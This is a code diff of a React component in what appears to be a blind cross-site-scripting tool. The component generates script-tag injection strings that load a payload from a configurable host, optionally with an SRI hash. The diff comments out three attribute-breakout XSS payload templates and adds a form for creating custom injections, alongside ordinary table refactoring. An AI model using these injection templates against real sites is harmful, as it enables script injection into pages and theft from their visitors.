@@ -2,7 +2,8 @@ import React from 'react';
 import axios from 'axios';
 
 import { API_PAYLOADS, URL_PAYLOAD} from "../helpers/constants"
-import { Table, TableCell, TableRow, TableHead, Checkbox, Select, Container, FormLabel} from '@material-ui/core';
+import { TableCell, TableRow, Checkbox, Select, Container, FormLabel, Button, Input } from '@material-ui/core';
+import EnhancedTable from './Table';
 
 const REPLACE_URL_TAG = "##URL_ID_PAYLOAD_OR_ALIAS##"
 const REPLACE_SRI_TAG = "##SRI_HASH##"
@@ -12,15 +13,22 @@ export default class InjectionsList extends React.Component {
     constructor(props) {
         super(props)
         this.state = {
+            headCells: [
+                { id: 'Name', numeric: false, disablePadding: true, label: 'Name', ellipsis: true },
+                { id: 'Injection', numeric: false, disablePadding: false, label: 'Injection' },
+                { id: 'Created_At', numeric: false, disablePadding: false, label: 'Created At', ellipsis: true },
+            ],
+            newName: "",
+            newContent: "",
             currentAlias : "",
             aliasesOrPayloadsIDs: [""],
             useSubdomain: false,
             useHTTPS: true,
             SRIKind: SRIKinds[0],
             injections: [
-                {"title": "basic", "content": `"><script src="##URL_ID_PAYLOAD_OR_ALIAS##"></script>`},
-                {"title": "No quote", "content": `<script src=##URL_ID_PAYLOAD_OR_ALIAS##></script>`},
-                {"title": "With SRI", "content": `<script src="##URL_ID_PAYLOAD_OR_ALIAS##" integrity="##SRI_HASH##"></script>`},
+                // {"title": "basic", "content": `"><script src="##URL_ID_PAYLOAD_OR_ALIAS##"></script>`},
+                // {"title": "No quote", "content": `<script src=##URL_ID_PAYLOAD_OR_ALIAS##></script>`},
+                // {"title": "With SRI", "content": `<script src="##URL_ID_PAYLOAD_OR_ALIAS##" integrity="##SRI_HASH##"></script>`},
             ],
         }
     };
@@ -88,6 +96,19 @@ export default class InjectionsList extends React.Component {
         }
         return ""
     }
+    newTableRow = (injection) => {
+        return (
+            <TableRow>
+                <TableCell>{injection.title}</TableCell>
+                <TableCell>{this.formatInjection(injection.content)}</TableCell>
+            </TableRow>
+        )
+    }
+    newInjection = (event) => {
+        let injections = this.state.injections
+        injections.push({ "title": this.state.newName, "content": this.state.newContent })
+        this.setState({"injections": injections})
+    }
     render() {
         return (
             <Container>
@@ -135,23 +156,12 @@ export default class InjectionsList extends React.Component {
                             }
                     </Select>
                 </FormLabel>
-                {/* <input type="checkbox" id="useSubdomain" onChange={this.toggleSubdomain}></input> */}
-                <Table className="table" aria-label="simple table">
-                    <TableHead>
-                        <TableCell>Name</TableCell>
-                        <TableCell>Injection</TableCell>
-                    </TableHead>
-                    {
-                        this.state.injections.map((injection) => {
-                            return (
-                                <TableRow>
-                                    <TableCell>{injection.title}</TableCell>
-                                    <TableCell>{this.formatInjection(injection.content)}</TableCell>
-                                </TableRow>
-                            )
-                        })
-                    }
-                </Table>
+                
+                <EnhancedTable headCells={this.state.headCells} data={this.state.injections}></EnhancedTable>
+
+                <Input type="text" placeholder="Name" onChange={(event) => this.setState({ newName: event.target.value })}></Input>
+                <Input type="text" placeholder="Injection" onChange={(event) => this.setState({ newContent: event.target.value })}></Input>
+                <Button onClick={this.newInjection}>Create a new injection</Button>
             </Container>
         );
     };
